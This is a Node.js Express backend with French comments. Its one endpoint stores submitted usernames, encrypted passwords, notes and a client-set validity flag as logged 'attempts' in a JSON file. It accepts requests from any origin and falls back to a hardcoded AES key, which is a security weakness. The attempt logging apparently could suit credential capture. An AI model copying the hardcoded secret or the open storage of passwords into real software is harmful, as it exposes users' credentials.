const express = require("express");
const cors = require("cors");
require("dotenv").config();
const crypto = require("crypto");
const fs = require("fs");

const app = express();

app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const USERS_FILE = "./users.json";

// =============================
// CHIFFREMENT BACKEND
// =============================

function getBackendKey() {
    // Utilise la clé du .env ou une clé de secours de 32 octets exacts
    const keyEnv = process.env.AES_KEY || "MaCleSecreteSuperSecurisee32Byte";
    return Buffer.alloc(32, keyEnv, "utf8");
}

function encrypt(text) {
    if (!text) return null;

    const key = getBackendKey();
    const iv = crypto.randomBytes(12);

    const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);

    let encrypted = cipher.update(text, "utf8", "hex");
    encrypted += cipher.final("hex");

    const authTag = cipher.getAuthTag();

    return {
        encrypted,
        iv: iv.toString("hex"),
        authTag: authTag.toString("hex")
    };
}

// =============================
// ROUTES
// =============================

app.get("/", (req, res) => {
    res.json({ message: "Backend MY site actif" });
});

app.post("/save-password", (req, res) => {
    const {
        username,
        password,
        encryptedPassword,
        iv,
        notes,
        isValid
    } = req.body;

    const submittedPassword = password || encryptedPassword;

    if (!username || !submittedPassword) {
        return res.status(400).json({
            error: "Données manquantes (username et mot de passe requis)"
        });
    }

    let finalPasswordData;

    if (encryptedPassword) {
        finalPasswordData = {
            encrypted: encryptedPassword,
            iv: iv || null,
            source: "client-side-encrypted"
        };
    } else {
        finalPasswordData = encrypt(password);
    }

    const encryptedNotes = notes ? encrypt(notes) : null;

    let users = [];

    if (fs.existsSync(USERS_FILE)) {
        try {
            const fileData = fs.readFileSync(USERS_FILE, "utf8");
            users = JSON.parse(fileData);
        } catch (err) {
            console.error("Erreur de lecture du fichier JSON :", err);
            users = [];
        }
    }

    // Sauvegarde la tentative dans le fichier JSON
    users.push({
        username: username,
        password: finalPasswordData,
        notes: encryptedNotes,
        isValidAttempt: isValid !== undefined ? isValid : null,
        createdAt: new Date().toISOString()
    });

    try {
        fs.writeFileSync(
            USERS_FILE,
            JSON.stringify(users, null, 2)
        );

        return res.json({
            success: true,
            message: "Données enregistrées avec succès !"
        });
    } catch (err) {
        console.error("Erreur d'écriture dans le fichier JSON :", err);
        return res.status(500).json({
            error: "Erreur serveur lors de la sauvegarde"
        });
    }
});

app.listen(PORT, () => {
    console.log(`Serveur lancé sur le port ${PORT}`);
});